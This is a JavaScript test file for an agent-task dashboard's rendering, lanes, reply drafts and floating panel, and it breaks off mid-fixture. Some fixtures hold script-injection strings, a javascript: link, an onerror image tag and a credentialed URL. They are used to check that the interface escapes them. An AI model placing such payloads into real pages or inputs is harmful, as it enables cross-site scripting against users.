// Pure rendering, state and draft checks for the dashboard; no browser or page execution.
const assert = require('node:assert/strict');
const fs = require('node:fs');
const vm = require('node:vm');

const elements = {'meta[name="hq-token"]': {content: 'test'}};
const context = vm.createContext({URL, URLSearchParams, File, atob, document: {
  body: {dataset: {}},
  querySelector(selector) {return elements[selector] || null;},
  querySelectorAll() {return [];},
}});
const source = fs.readFileSync('hq/static/app.js', 'utf8');
vm.runInContext(source.slice(0, source.indexOf('function boot()')), context);
const run = (code) => vm.runInContext(code, context);
const now = Date.now() / 1000;
const item = (fields) => ({status: 'open', owner: 'human', kind: 'todo', bucket: 'needs', tags: [], options: [], steps: [], paste: [],
  comments: [], detail: '', created: now - 7200, updated: now - 7200, rank: 9999, project: 'noclick', project_name: 'NoClick',
  workstream: 'support', workstream_name: 'Support', session_id: 'codex:a', session_name: 'Shared <project>', provider: 'codex', ...fields});

context.queue = {
  instance: 'server-one', revision: 5,
  sessions: [
    {id: 'codex:a', name: 'Shared <project>', provider: 'codex', activity: {state: 'active'}},
    {id: 'codex:b', name: 'Shared <project>', provider: 'codex', activity: {state: 'idle'}},
    {id: 'claude:c', name: 'Shared <project>', provider: 'claude-code'},
    {id: 'claude:empty', name: 'Discovered empty chat', provider: 'claude-code'},
  ],
  items: [
    item({id: 'a1', title: 'Human <b>action</b>', rank: 300}),
    item({id: 'a2', title: 'Agent action', owner: 'agent', bucket: 'pending', workstream: 'billing', workstream_name: 'Billing and usage'}),
    item({id: 'b1', session_id: 'codex:b', title: 'Saved answer', kind: 'question', status: 'answered', bucket: 'waiting', delivery: 'pending', answer: 'Annual'}),
    item({id: 'c1', session_id: 'claude:c', title: 'Outside dependency', owner: 'external', waiting_on: 'Vendor', bucket: 'waiting', kind: 'blocker'}),
    item({id: 'd1', session_id: 'codex:a', title: 'Finished work', status: 'done', bucket: 'done', updated: now - 60}),
    item({id: 'h1', title: 'Restyle the inbox', project: 'hq', project_name: 'HQ', workstream: 'design', workstream_name: 'Design', kind: 'question', rank: 20, created: now - 600}),
    item({id: 'p1', title: 'Pinned one', pinned: true, created: now - 90000}),
    item({id: 'u1', title: 'Due today', due: run('today()'), created: now - 90000}),
    item({id: 'l1', title: 'Snoozed', bucket: 'later', defer_until: '2099-01-01'}),
    item({id: 'q1', title: 'Asked the agent', asking: true, comments: [{id: 'q', author: 'human', text: '<script>bad()</script>', state: 'pending', answered: false}]}),
  ],
};
run('applyState(queue); model = derive()');

// Lanes follow who must act next.
const lane = (id) => run(`model.items.find(i => i.id === '${id}').lane`);
assert.equal(lane('a1'), 'you');
assert.equal(lane('a2'), 'agents');
assert.equal(lane('b1'), 'agents'); // a saved reply waits on the agent
assert.equal(lane('c1'), 'waiting');
assert.equal(lane('d1'), 'done');
assert.equal(lane('l1'), 'later');
assert.equal(lane('q1'), 'agents'); // an open question leaves Needs you until answered

// Needs you (Views + Groups): grouped by project by default, smart order inside each group.
run('needsState = cleanNeeds(null, "project")');
let html = run('needsPage().body');
assert.ok(html.includes('class="gh "') && html.indexOf('>HQ<') < html.indexOf('>NoClick<')); // projects by name
assert.ok(html.indexOf('Restyle the inbox') < html.indexOf('>NoClick<')); // HQ's own item sits under HQ
assert.ok(!html.includes('<b>action</b>'));
assert.ok(!html.includes('Agent action') && !html.includes('Snoozed') && !html.includes('Asked the agent'));
run('needsState.group = "none"');
html = run('needsPage().body');
// Smart: pinned first, then due soon, then priority (rank 20 before 300).
assert.ok(html.indexOf('Pinned one') < html.indexOf('Due today') && html.indexOf('Due today') < html.indexOf('Restyle the inbox'));
assert.ok(html.indexOf('Restyle the inbox') < html.indexOf('Human &lt;b&gt;action&lt;/b&gt;'));
assert.ok(html.includes('NoClick › Support')); // ungrouped rows say where they live
run('needsState.order = "newest"');
html = run('needsPage().body');
assert.ok(html.indexOf('Restyle the inbox') < html.indexOf('Pinned one')); // newest first
run('needsState = cleanNeeds(null, "project")');

// Workstream pages count each lane for that scope only.
run("route = parseRoute('#/p/noclick/support?lane=waiting')");
const page = run('workstreamPage()');
assert.equal(page.title, 'Support');
assert.ok(page.body.includes('data-lane="you" aria-selected="false">Needs you<span class="n">3</span>'));
assert.ok(page.body.includes('Outside dependency') && !page.body.includes('Human &lt;b&gt;'));
assert.equal(run("href({page: 'workstream', project: 'noclick', workstream: 'support', lane: 'waiting', item: 'c1'})"), '#/p/noclick/support?lane=waiting&item=c1');

// Similar names, harnesses and tags never combine separate conversations.
run("route = parseRoute('#/agents')");
assert.deepEqual(Array.from(run('model.agents.map(a => a.id)')), ['codex:a', 'codex:b', 'claude:c']);
run("route = parseRoute('#/agents/codex%3Ab'); model = derive()");
assert.deepEqual(Array.from(run('scopeItems().map(i => i.id)')), ['b1']);
html = run('agentsPage().body');
assert.ok(html.includes('data-session="codex:a"') && html.includes('Shared &lt;project&gt;'));
assert.ok(html.includes('class="f-name">No folder<') && html.indexOf('f-name') < html.indexOf('data-session="codex:a"')); // grouped by folder
// The selected conversation stays visible when its last open item completes.
context.queue = {...context.queue, revision: 6, items: context.queue.items.map(i => i.session_id === 'codex:b' ? {...i, status: 'done', bucket: 'done'} : i),
  sessions: context.queue.sessions.map(s => s.id === 'codex:b' ? {...s, activity: {state: 'offline'}} : s)};
run('applyState(queue); model = derive()');
assert.ok(Array.from(run('model.agents.map(a => a.id)')).includes('codex:b'));
run("route = parseRoute('#/'); model = derive()");
assert.ok(!Array.from(run('model.agents.map(a => a.id)')).includes('codex:b'));
assert.ok(!Array.from(run('model.agents.map(a => a.id)')).includes('claude:empty'));

// Presence uses harness state, and becomes Unknown while the stream is down.
assert.equal(run("agentState(state.sessions[0])"), 'active');
run('liveHealthy = false');
assert.equal(run("agentState(state.sessions[0])"), 'unknown');
run('liveHealthy = true');

// Older or replayed snapshots never replace newer state.
context.older = {...context.queue, revision: 4, items: []};
run('applyState(older)');
assert.equal(run('state.revision'), 6);
context.restarted = {...context.queue, instance: 'server-two', revision: 1};
run('applyState(restarted)');
run('applyState(queue)');
assert.equal(run('state.instance'), 'server-two');
run('streamEvent(\'event: ping\\ndata: {"healthy":false}\')');
assert.equal(run('liveHealthy'), false);
run('streamEvent(\'event: ping\\ndata: {}\')');
assert.equal(run('liveHealthy'), true);

// The ask thread escapes text, refuses credentialed links and offers cancel only while pending.
run("model = derive()");
html = run("askHTML(model.items.find(i => i.id === 'q1'), {})");
assert.ok(html.includes('&lt;script&gt;') && !html.includes('<script>'));
assert.ok(html.includes('Cancel question') && html.includes('queued for the agent'));
context.answered = {...run("model.items.find(i => i.id === 'q1')"), comments: [
  {id: 'q', author: 'human', text: 'Why?', state: 'received', answered: true},
  {id: 'a', author: 'agent', parent_id: 'q', text: '**Short answer** [bad](https://user:secret@example.com)'}]};
html = run('askHTML(answered, {})');
assert.ok(html.includes('<strong>Short answer</strong>') && !html.includes('href="https://user:secret'));
assert.ok(!html.includes('Cancel question'));

// Readable items escape every agent-written field and refuse unsafe links.
context.readable = item({id: 'r', title: 'Send one message', minutes: 3,
  steps: [{text: 'Open <b>it</b>', link: {label: 'x', url: 'javascript:alert(1)'}}, {text: 'Send', copy: '<img onerror=x>'},
          {text: 'Check', checks: ['<script>a()</script>', 'Second']}, 'Plain step'],
  matters: {lead: '<i>lead</i>', points: ['**fact**']}, needs_you: {lead: 'Only you', points: []}, detail: 'Original paragraph'});
assert.equal(run('isReadable(readable)'), true);
assert.equal(run("isReadable({steps: ['a']})"), false);
const plan = run('planHTML(readable, {})');
assert.ok(!plan.includes('javascript:') && !plan.includes('<script>') && !plan.includes('<img') && !plan.includes('<b>'));
assert.ok(plan.includes('0 of 2') && plan.includes('Plain step'));
assert.equal((plan.match(/data-check=/g) || []).length, 2);
const reasons = run('reasonsHTML(readable)');
assert.ok(reasons.includes('Why it matters') && reasons.includes('Why you, not the agent'));
assert.ok(reasons.includes('<strong>fact</strong>') && !reasons.includes('<i>'));
assert.deepEqual(Array.from(run('checksOf(readable).map(c => c.key)')), ['2:0', '2:1']);

// Drafts survive live refreshes: ticks, replies, questions and move fields.
context.queue = {...context.queue, instance: 'server-two', revision: 9, items: [...context.queue.items, context.readable]};
run("applyState(queue); model = derive(); route = parseRoute('#/?item=r')");
run("setDraft('r', {checks: ['2:0'], question: 'Unsent question', due: '2026-11-02'}); openMove = 'due'");
context.queue = {...context.queue, revision: 10};
run('applyState(queue); model = derive()');
html = run("detailHTML(model.items.find(i => i.id === 'r'))");
assert.ok(html.includes('1 of 2') && html.includes('data-check="2:0" aria-checked="true"'));
assert.ok(html.includes('value="2026-11-02"'));
assert.ok(html.includes('Looks right') && html.includes('placeholder="Reply, or add a note…"')); // you can always just reply
// Checks end in a wide Looks right, honest about what is still unticked.
assert.ok(html.includes('data-report="ok"') && html.includes('Looks right (1 of 2 ticked)'));
assert.ok(html.includes('class="ghost-pill" data-report="off" >Something was off')); // a check is unticked, so it has something to say
assert.ok(html.indexOf('id="reply"') < html.indexOf('data-report="off"')); // the box sits above the two buttons
assert.equal(run('lookedRight(1, 2)'), 'Looked right (1 of 2 ticked)');
assert.equal(run('lookedRight(2, 2)'), 'All 2 looked right');
assert.equal(run('lookedRight(2, 2, true)'), 'Looks right');
// The background and where it came from live in Context.
assert.ok(!html.includes('Original paragraph'));
run("setDraft('r', {tab: 'context'})");
html = run("detailHTML(model.items.find(i => i.id === 'r'))");
assert.ok(html.includes('Original paragraph') && html.includes('Hard to read?'));
assert.ok(html.includes('data-tab="context" aria-selected="true"'));
run("setDraft('r', {tab: 'ask'})");
html = run("detailHTML(model.items.find(i => i.id === 'r'))");
assert.ok(html.includes('Unsent question'));
// The three sends on an item with checks: a plain reply, Looks right, and Something was off.
const checksSend = (kind, typed, draft) => run(`checksReply(${JSON.stringify(kind)}, ${JSON.stringify(typed)}, model.items.find(i => i.id === 'r'), ${JSON.stringify(draft)})`);
assert.equal(checksSend('reply', '  Picked the second one ', {checks: ['2:0']}), 'Picked the second one');
assert.equal(checksSend('ok', '', {checks: ['2:0', '2:1']}), 'Looks right');
assert.equal(checksSend('ok', 'fast too', {checks: ['2:0', '2:1']}), 'Looks right — fast too');
assert.equal(checksSend('ok', '', {checks: ['2:0']}), 'Looks right (1 of 2 ticked)'); // honest about what was left unticked
assert.equal(checksSend('off', 'the preview was blank', {checks: ['2:0']}), "the preview was blank — Didn't see: Second");
assert.equal(checksSend('off', 'the preview was blank', {checks: ['2:0', '2:1']}), 'the preview was blank');
assert.equal(checksSend('off', '', {checks: ['2:0']}), "Didn't see: Second");
const offOk = (typed, draft) => run(`offReady(model.items.find(i => i.id === 'r'), ${JSON.stringify(draft)}, ${JSON.stringify(typed)})`);
assert.equal(offOk('', {checks: ['2:0', '2:1']}), false); // all ticked and nothing typed: nothing was off
assert.equal(offOk('blank preview', {checks: ['2:0', '2:1']}), true);
assert.equal(offOk('', {checks: ['2:0']}), true);
assert.equal(offOk('', {checks: ['2:0', '2:1'], files: {text: [{status: 'ready', id: 'x'}]}}), true); // a screenshot says it
assert.equal(offOk('blank', {checks: ['2:0'], files: {text: [{status: 'uploading'}]}}), false);
run("setDraft('r', {tab: undefined})");
html = run("detailHTML(model.items.find(i => i.id === 'a2'))");
assert.ok(!html.includes('Hard to read?')); // agents' own work isn't sent back to them
// Skip sits with the other not-now choices and reads as its own outcome once taken.
assert.ok(run("movesHTML(model.items.find(i => i.id === 'a1'))").includes('data-move="skip"'));
run("openMove = 'skip'");
assert.ok(run("movesHTML(model.items.find(i => i.id === 'a1'))").includes('tells the agent to drop it'));
run("openMove = null");
context.skipped = item({id: 's1', status: 'done', bucket: 'done', skipped: true, answer: 'Skipped: …', delivery: 'received', updated: now});
context.skipped.lane = 'done';
assert.ok(run('metaHTML(skipped)').startsWith('Skipped'));
html = run('detailHTML(skipped)');
assert.ok(html.includes('You skipped this') && html.includes('the agent knows to drop it') && !html.includes('data-move="skip"'));

// The item page: tabs above, the answer docked below.
context.decide = item({id: 'dq', kind: 'question', title: 'Pick a date', options: [
  {label: 'Tuesday the 12th', note: 'Support gets a week', recommended: true}, {label: 'Thursday <14th>', note: 'More docs time'}, 'Later'],
  matters: {lead: 'Unblocks the release', points: []}, needs_you: {lead: 'Your call', points: []}, recommendation: 'Tuesday'});
context.plain = item({id: 'pl', title: 'Legacy item', detail: 'Only text'});
context.failed = item({id: 'fd', status: 'answered', bucket: 'waiting', delivery: 'failed', answer: 'Annual', delivery_error: 'Codex is not running'});
context.queue = {...context.queue, revision: 11, items: [...context.queue.items, context.decide, context.plain, context.failed]};
run('applyState(queue); model = derive()');
const pane = (id) => run(`detailHTML(model.items.find(i => i.id === '${id}'))`);
const tabIds = (id) => Array.from(run(`tabsOf(model.items.find(i => i.id === '${id}')).map(t => t.id)`));
// Steps leads when there are steps; without them Why, and a bare item opens on Context.
assert.deepEqual(tabIds('r'), ['steps', 'why', 'context', 'ask']);
assert.deepEqual(tabIds('dq'), ['why', 'context', 'ask']); // no steps, so no Steps tab
assert.deepEqual(tabIds('pl'), ['context', 'ask']);
assert.equal(run("tabOf(model.items.find(i => i.id === 'r'))"), 'steps');
assert.equal(run("tabOf(model.items.find(i => i.id === 'dq'))"), 'why');
assert.equal(run("tabOf(model.items.find(i => i.id === 'pl'))"), 'context');
assert.equal(run("tabOf(model.items.find(i => i.id === 'dq'), {tab: 'steps'})"), 'why'); // a tab it lacks falls back
html = pane('r');
assert.ok(html.includes('role="tablist"') && html.includes('data-tab="steps" aria-selected="true"') && html.includes('Steps<span class="n">4</span>'));
assert.ok(html.indexOf('class="d-head"') < html.indexOf('class="d-tabs"') && html.indexOf('class="d-body') < html.indexOf('class="d-dock"'));
assert.ok(pane('q1').includes('Ask<span class="n">1</span>'));
assert.ok(pane('pl').includes('Only text'));
// Nothing picked: the box is the answer, with its arrow, and the send row is folded away.
html = pane('dq');
assert.ok(html.includes('data-state="free"') && html.includes('placeholder="Or answer in your own words…"'));
assert.ok(html.includes('class="d-fold open" data-fold="note"') && html.includes('class="d-fold " data-fold="go" inert'));
assert.ok(html.includes('role="radio" data-choice="Thursday &lt;14th&gt;" aria-checked="false"') && !html.includes('<14th>'));
assert.ok(html.includes('aria-label="Send" disabled'));
// Picked: the box folds away and the wide button sends the option.
run("setDraft('dq', {choice: 'Tuesday the 12th'})");
html = pane('dq');
assert.ok(html.includes('data-state="picked"') && html.includes('class="d-fold " data-fold="note" inert') && html.includes('class="d-fold open" data-fold="go"'));
assert.ok(html.includes('<span>Send: Tuesday the 12th</span>') && html.includes('</svg>Note</button>'));
const reply = (draft, typed) => run(`replyText(model.items.find(i => i.id === 'dq'), ${JSON.stringify(draft)}, ${JSON.stringify(typed)})`);
assert.equal(reply({choice: 'Tuesday the 12th'}, ''), 'Tuesday the 12th');
// + Note opens the box above the row, with your text kept and the label saying so.
run("setDraft('dq', {note: true, text: 'after standup'})");
html = pane('dq');
assert.ok(html.includes('data-state="note"') && html.includes('class="d-fold open" data-fold="note"') && html.includes('class="d-fold open" data-fold="go"'));
assert.ok(html.includes('placeholder="Add a note to “Tuesday the 12th”…"') && html.includes('>after standup</textarea>'));
assert.ok(html.includes('aria-pressed="true">Remove note') && html.includes('<span>Send: Tuesday the 12th + note</span>'));
assert.equal(run("wideLabel('Later', '')"), 'Send: Later');
assert.equal(reply({choice: 'Tuesday the 12th', note: true}, ' after standup '), 'Tuesday the 12th — after standup'); // as replies always were
// Text typed before picking becomes the note; unpicking turns it back into the answer.
const state = (draft) => run(`answerState(model.items.find(i => i.id === 'dq'), ${JSON.stringify(draft)})`);
assert.equal(state({choice: 'Later', text: 'because'}), 'note');
assert.equal(state({choice: null, text: 'because'}), 'free');
assert.equal(reply({text: 'because'}, 'because'), 'because');
assert.equal(state({choice: 'Gone option'}), 'free'); // an option the agent removed is not sent
// Escape closes an empty note first; with text in it, Escape is left alone.
assert.equal(run("noteEscape(model.items.find(i => i.id === 'dq'), {choice: 'Later', note: true}, '  ')"), true);
assert.equal(run("noteEscape(model.items.find(i => i.id === 'dq'), {choice: 'Later', note: true}, 'kept')"), false);
assert.equal(run("noteEscape(model.items.find(i => i.id === 'dq'), {}, '')"), false);
assert.equal(state({choice: 'Later', note: false}), 'picked');
run("setDraft('dq', {choice: undefined, note: undefined, text: undefined})");
// Enter sends, Shift+Enter is a new line, and an input method's Enter is its own.
assert.equal(run("composeKey({key: 'Enter'})"), 'send');
assert.equal(run("composeKey({key: 'Enter', metaKey: true})"), 'send');
assert.equal(run("composeKey({key: 'Enter', shiftKey: true})"), 'newline');
assert.equal(run("composeKey({key: 'Enter', isComposing: true})"), null);
assert.equal(run("composeKey({key: 'Enter', keyCode: 229})"), null);
assert.equal(run("composeKey({key: 'a'})"), null);
// Free replies keep their own words, in a box with no footer or hint line below it.
html = pane('a1');
assert.ok(html.includes('placeholder="Tell the agent what you did…"') && !html.includes('compose-hint') && !html.includes('composer-foot'));
assert.ok(!html.includes('data-fold="go"'));
assert.ok(html.includes('data-done>Mark done') && !pane('dq').includes('data-done')); // decisions are answered or skipped
// A reply that failed to deliver offers the wide Retry.
html = pane('fd');
assert.ok(html.includes('<button class="go-wide" type="button" data-retry><span>Retry delivery</span>') && html.includes('Codex is not running'));
assert.ok(!html.includes('id="respond"'));

// The floating panel shares this state and reuses the item pane.
const floatSource = fs.readFileSync('hq/static/float.js', 'utf8');
vm.runInContext(floatSource.slice(0, floatSource.indexOf('function bootFloat()')), context);
const area = {x: 0, y: 25, width: 1440, height: 800}; // a menu bar on top, no Dock
const rect = (dock, size = {width: 72, height: 32}, free = area) => JSON.parse(run(`JSON.stringify(dockRect(${JSON.stringify(dock)}, ${JSON.stringify(size)}, ${JSON.stringify(free)}))`));

// Corners sit right against the free screen, and the bottom edge sits closest of all.
assert.deepEqual(rect('top-left'), {x: 10, y: 35, width: 72, height: 32});
assert.deepEqual(rect('top-right'), {x: 1358, y: 35, width: 72, height: 32});
assert.deepEqual(rect('top'), {x: 684, y: 35, width: 72, height: 32});
assert.deepEqual(rect('left'), {x: 10, y: 409, width: 72, height: 32});
assert.deepEqual(rect('right'), {x: 1358, y: 409, width: 72, height: 32});
assert.deepEqual(rect('bottom-left'), {x: 10, y: 789, width: 72, height: 32});
assert.deepEqual(rect('bottom-right'), {x: 1358, y: 789, width: 72, height: 32});
assert.deepEqual(rect('bottom'), {x: 684, y: 789, width: 72, height: 32});
// The box grows away from its dock and always stays on the free screen.
assert.deepEqual(rect('top-right', {width: 480, height: 600}), {x: 950, y: 35, width: 480, height: 600});
assert.deepEqual(rect('bottom-right', {width: 480, height: 600}), {x: 950, y: 221, width: 480, height: 600});
assert.deepEqual(rect('top-left', {width: 480, height: 5000}), {x: 10, y: 35, width: 480, height: 786});
assert.deepEqual(rect('top-left', {width: 500, height: 100}, {x: 0, y: 0, width: 520, height: 400}), {x: 10, y: 10, width: 500, height: 100});
// Docking follows the free area of a display, wherever that is.
assert.deepEqual(rect('left', {width: 72, height: 32}, {x: 80, y: 0, width: 1000, height: 700}), {x: 90, y: 334, width: 72, height: 32});
assert.deepEqual(rect('no such dock'), rect('top-left')); // an old saved name falls back
assert.equal(run("growFrom('top-left')"), 'left top');
// The capsule stands up at the sides and lies along an edge when centered on it.
for (const dock of ['top-left', 'top-right', 'left', 'right', 'bottom-left', 'bottom-right']) assert.equal(run(`layoutFor('${dock}')`), 'vertical', dock);
for (const dock of ['top', 'bottom']) assert.equal(run(`layoutFor('${dock}')`), 'horizontal', dock);
assert.equal(run("layoutFor('bottom', 'vertical')"), 'vertical'); // the lab can force either
assert.equal(run("layoutFor('left', 'horizontal')"), 'horizontal');
const measured = {width: 38, height: 102};
assert.deepEqual(JSON.parse(run(`JSON.stringify(capsuleSize(${JSON.stringify(measured)}, 'horizontal'))`)), {width: 102, height: 38});
assert.deepEqual(JSON.parse(run(`JSON.stringify(capsuleSize({width: 102, height: 38}, 'vertical'))`)), measured);
const zones = JSON.parse(run(`JSON.stringify(dockRects(${JSON.stringify(measured)}, ${JSON.stringify(area)}))`));
assert.deepEqual(zones.bottom, {x: 669, y: 783, width: 102, height: 38}); // lying down, 4 above the free edge
assert.deepEqual(zones['top-left'], {x: 10, y: 35, width: 38, height: 102}); // standing up, in the corner
assert.deepEqual(zones.top, {x: 669, y: 35, width: 102, height: 38});
assert.equal(run("growFrom('bottom')"), 'center bottom');

// A drop goes to the nearest target, measured to its center, as in OpenFlow.
const nearest = (x, y, set = 'all') => run(`nearestDock(${x}, ${y}, dockRects({width: 72, height: 32}, ${JSON.stringify(area)}, TARGETS[${JSON.stringify(set)}]))`);
assert.equal(nearest(5, 5), 'top-left');
assert.equal(nearest(1435, 5), 'top-right');
assert.equal(nearest(720, 40), 'top');
assert.equal(nearest(5, 425), 'left');
assert.equal(nearest(720, 820), 'bottom');
assert.equal(nearest(720, 820, 'corners'), 'bottom-left'); // equally far, so the first wins; only corners are offered
assert.equal(nearest(1430, 820, 'flow'), 'right'); // the corner it would prefer is not offered
assert.deepEqual(Array.from(run("Object.keys(dockRects({width: 72, height: 32}, area0 = {x: 0, y: 0, width: 800, height: 600}, TARGETS.flow))")), ['top-left', 'left', 'right', 'bottom']);

// The list is what needs you, and a reply that failed to deliver needs you again.
const floatItems = [
  item({id: 'f-old', title: 'Older action', created: now - 90000}),
  item({id: 'f-new', title: 'Newest <b>decision</b>', kind: 'question', created: now - 60}),
  item({id: 'f-pin', title: 'Pinned action', pinned: true, created: now - 200000}),
  item({id: 'f-due', title: 'Due today', due: run('today()'), created: now - 150000}),
  item({id: 'f-rank', title: 'Ranked first', rank: 10, created: now - 80000}),
  item({id: 'f-fail', title: 'Reply bounced', status: 'answered', bucket: 'waiting', delivery: 'failed', created: now - 300000}),
  item({id: 'f-sent', title: 'Reply fine', status: 'answered', bucket: 'waiting', delivery: 'pending'}),
  item({id: 'f-done', title: 'Old failure, finished', status: 'done', bucket: 'done', delivery: 'failed'}),
  item({id: 'f-skip', title: 'Skip not delivered', status: 'done', bucket: 'done', skipped: true, delivery: 'failed', created: now - 400000}),
  item({id: 'f-agent', title: 'Agent work', owner: 'agent', bucket: 'pending'}),
  item({id: 'f-later', title: 'Snoozed', bucket: 'later', defer_until: '2099-01-01'}),
  item({id: 'f-ask', title: 'Asking', asking: true}),
];
context.queue = {instance: 'server-float', revision: 1, sessions: context.queue.sessions, items: floatItems};
run('applyState(queue); model = derive()');
const listed = () => Array.from(run('attention().map(i => i.id)'));
assert.deepEqual(listed(), ['f-fail', 'f-skip', 'f-pin', 'f-due', 'f-new', 'f-rank', 'f-old']);
run("feel.order = 'newest'");
assert.deepEqual(listed(), ['f-fail', 'f-skip', 'f-new', 'f-rank', 'f-old', 'f-due', 'f-pin']);
run("feel.order = 'urgent'");
assert.deepEqual(listed(), ['f-fail', 'f-skip', 'f-pin', 'f-due', 'f-rank', 'f-new', 'f-old']);
run("feel.order = 'lead'; feel.show = 2");
assert.deepEqual(listed(), ['f-fail', 'f-skip']);
run('feel.show = 100000');
assert.ok(run('feel.show') >= 10000); // the real list is never cut short

html = run('floatListHTML(attention(), true)');
assert.ok(html.includes('Newest &lt;b&gt;decision&lt;/b&gt;') && !html.includes('<b>decision</b>'));
assert.ok(html.includes('data-item="f-new"') && html.includes('Decision') && html.includes('NoClick › Support'));
assert.ok(html.includes('Reply failed') && html.includes('<span class="h">Needs you</span><span class="count">7</span>') && html.includes('data-more'));
// Agents is reached only from its circle, never from Needs you; Not acted on, a view of your own
// decisions, is the view menu's plain last entry, and only when there is one.
run('needsFilter().open = "view"');
html = run('floatListHTML(attention(), true)');
assert.ok(!html.includes('data-view="agents"') && !html.includes('>Agents<') && !html.includes('Elsewhere'));
run('realStuck = stuckItems; stuckItems = () => [{id: "s1"}, {id: "s2"}]');
assert.ok(run('floatListHTML(attention(), true)').includes('<div class="p-rule"></div><button class="g-opt" type="button" data-view="stuck"><span class="tick"></span><span class="o-text">Not acted on</span><span class="n">2</span></button></div>'));
run('stuckItems = realStuck; needsFilter().open = null');
assert.ok(!html.includes('data-collapse') && !html.includes('target="_blank"')); // one menu, not a cross and an arrow
assert.ok(!html.includes('Reconnecting'));
assert.ok(run('floatListHTML(attention(), false)').includes('Reconnecting'));
assert.ok(run('floatListHTML([], true)').includes('Nothing needs you'));

// Agents already running when the panel starts are its baseline, so nothing is announced.
run("agentMemory.clear(); watchAgents.settled = undefined; heard = []; realEnqueue = enqueue; enqueue = (events) => heard.push(...events)");
run('watchAgents()');
assert.equal(run("agentMemory.get('codex:a').running"), true); // known to be running already
run("watchAgents(); trackAgents(agentMemory, state.sessions.map((s) => ({id: s.id, name: s.name, harness: harness(s.provider), state: agentState(s)})), Date.now() / 1000 + 60).forEach((e) => heard.push(e))");
assert.equal(run('heard.length'), 0);
run('enqueue = realEnqueue; agentMemory.clear(); watchAgents.settled = undefined');
// The spotlight answers the pill alone: a few pixels of slack, never the open box.
const pillRect = {left: 10, right: 48, top: 35, bottom: 137}, boxRect = {left: 56, right: 436, top: 35, bottom: 400};
assert.equal(run(`overPill(${JSON.stringify(pillRect)}, null, 20, 60)`), true);
assert.equal(run(`overPill(${JSON.stringify(pillRect)}, null, 52, 60)`), true); // just past the edge
assert.equal(run(`overPill(${JSON.stringify(pillRect)}, ${JSON.stringify(boxRect)}, 200, 60)`), false); // in the list
assert.equal(run(`overPill(${JSON.stringify(pillRect)}, null, 200, 60)`), false); // far away, box or not
assert.equal(run(`overPill(${JSON.stringify(pillRect)}, ${JSON.stringify({...boxRect, left: 50})}, 52, 60)`), false); // the box wins where they meet
// With the box open the circle still steps forward, but its label would cover the header.
assert.equal(run('spotLabelled(false)'), true);
assert.equal(run('spotLabelled(true)'), false);

// Agents, by folder: running first, then waiting on you, then finished in the last day.
const clockNow = Math.floor(Date.now() / 1000); // ago() reads the real clock
context.agentSessions = [
  {id: 'c:old', name: 'Old <chat>', provider: 'claude-code', cwd: '/Users/someone/code/harbor', activity: {state: 'idle'}, last_active: clockNow - 3 * 86400},
  {id: 'c:done', name: 'Docs pass', provider: 'claude-code', cwd: '/Users/someone/code/harbor', activity: {state: 'idle'}, last_active: clockNow - 2 * 3600},
  {id: 'x:run', name: 'Release build', provider: 'codex', cwd: '/Users/someone/code/lantern/', activity: {state: 'active', source: 'codex-live', since: clockNow - 65}, last_active: clockNow, created: clockNow - 100},
  {id: 'c:bg', name: 'Research with subagents', provider: 'claude-code', cwd: '/Users/someone/code/harbor', activity: {state: 'active', source: 'background', since: clockNow - 3725}, last_active: clockNow, created: clockNow - 200},
  {id: 'c:wait', name: 'Asks you first', provider: 'claude-code', cwd: '/Users/someone/code/site', activity: {state: 'waiting', since: clockNow - 30}, last_active: clockNow - 40, created: clockNow - 300},
  {id: 'c:nosig', name: 'No signal', provider: 'claude-code', cwd: '/Users/someone/code/site', activity: {state: 'unknown'}, last_active: clockNow - 600},
  {id: 'c:nofolder', name: 'Desktop chat', provider: 'claude-desktop', activity: {state: 'idle'}, last_active: clockNow - 1200},
];
context.agentItems = [item({id: 'ai1', session_id: 'c:done', title: 'Check the docs'}), item({id: 'ai2', session_id: 'c:done', title: 'With it', owner: 'agent', bucket: 'pending'})].map((i) => ({...i, lane: run('laneOf')(i)}));
const folders = JSON.parse(run(`JSON.stringify(agentFolders(agentSessions, agentItems, ${clockNow}))`));
// Folders are named by their last part only, never the path to them, and the one with work running leads.
assert.deepEqual(folders.groups.map((f) => f.name), ['lantern', 'harbor', 'site', 'No folder']);
assert.ok(!JSON.stringify(folders.groups.map((f) => [f.name, f.agents.map((a) => a.name)])).includes('/Users'));
assert.deepEqual(folders.groups.map((f) => f.running), [true, true, false, false]);
// Within a folder, running comes before finished; anything quiet for over a day folds away.
assert.deepEqual(folders.groups[1].agents.map((a) => a.id), ['c:bg', 'c:done']);
assert.deepEqual(folders.quiet.map((f) => [f.name, f.agents.map((a) => a.id)]), [['harbor', ['c:old']]]);
assert.equal(folders.running, 2);
assert.equal(folders.finished, 2); // the docs pass and the desktop chat, not the one with no live signal
// A conversation with agents working in the background is one running agent, and says so.
const bg = folders.groups[1].agents[0];
assert.equal(folders.groups.flatMap((f) => f.agents).filter((a) => a.id === 'c:bg').length, 1);
assert.equal(bg.state, 'active');
assert.equal(bg.background, true);
const meta = (id) => run(`agentMeta(agentFolders(agentSessions, agentItems, ${clockNow}).all.find((a) => a.id === '${id}'), ${clockNow})`);
assert.equal(meta('c:bg'), `running <span class="tick" data-since="${clockNow - 3725}">1h 02m</span> · in the background`);
// Times: a running clock from when the state began, and how long ago a finished one last ran.
assert.equal(meta('x:run'), `running <span class="tick" data-since="${clockNow - 65}">1m 05s</span>`);
assert.equal(run('ranFor(0)'), '0m 00s');
assert.equal(run('ranFor(7200)'), '2h 00m');
assert.equal(meta('c:wait'), 'waiting on you');
assert.ok(meta('c:done').startsWith('finished ') && meta('c:done').endsWith('h ago'));
assert.ok(meta('c:nosig').startsWith('no live signal · seen running')); // never "finished"
assert.ok(run(`agentStateLine(agentFolders(agentSessions, agentItems, ${clockNow}).all.find((a) => a.id === 'c:bg'), ${clockNow})`).startsWith('Agents running in the background for'));
assert.equal(folders.all.find((a) => a.id === 'c:done').you, 1);
assert.equal(run("agentSide({you: 2, open: 3})"), '<b>2</b> for you');
assert.equal(run("agentSide({you: 0, open: 3})"), '3 open');
assert.equal(run("folderName('/Users/someone/code/HQ/')"), 'HQ');
assert.equal(run("folderName('')"), 'No folder');
// Within a folder, by when each last ran, in bands that hold still: running, waiting on you or done
// in the last ten minutes is now, in a fixed order, the newest conversation first; then within the
// hour, the day and before, by when each last ran.
const at = (minutes) => clockNow - minutes * 60;
context.recencySessions = [
  {id: 'r:wait', name: 'Waiting an hour', provider: 'codex', cwd: '/c/noclick', activity: {state: 'waiting', since: at(60)}, last_active: at(61), created: at(300)},
